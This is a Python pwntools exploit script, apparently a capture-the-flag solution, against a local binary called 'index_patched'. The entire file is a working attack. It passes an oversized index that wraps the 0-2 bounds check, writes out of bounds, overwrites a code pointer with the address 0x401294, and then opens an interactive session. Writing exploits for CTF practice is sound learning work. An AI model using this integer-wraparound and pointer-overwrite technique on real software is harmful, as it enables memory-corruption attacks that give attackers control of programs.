#!/usr/bin/env python3
from pwn import *
exe = ELF("./index_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")
p = process([exe.path])
def GDB():
    context.terminal = ["alacritty", "-e"]
    gdb.attach(p, gdbscript='''
    # b*0x0000000000401331
    # b*0x000000000040136d
    # b*0x0000000000401397
    b*0x00000000004013e1



           ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


def main():
    GDB()
    # good luck pwning :)
    sla(b"3. Exit",b"1")
    sla(b'index to edit (0-2):',b"0") #0x404020
    sla(b"new message:",b"b"*99)
    # sla(b"3. Exit",b"1")
    # sla(b'index to edit (0-2):',b"184467440737095518") #0x4040d8
    # sla("new message:",b"a"*99)
    sla(b"3. Exit",b"1")
    sla(b'index to edit (0-2):',b"184467440737095517") #0x404074 
    sla("new message:",b"a"*17)
    # sla(b"3. Exit",b"1")
    # sla(b'index to edit (0-2):',b"2") #0x4040e8
    # sla(b"new message:",b"b"*99)
    sla(b"3. Exit",b"1")
    sla(b'index to edit (0-2):',b"1") #0x404084
    sla(b"new message:",b"b"*36 + p64(0x0000000000401294))
    sla(b"3. Exit",b"2")
    sla(b' index to read (0-2):',b"0")
    sla(b"3. Exit",b"3")
    p.interactive()





















if __name__ == "__main__":
    main()
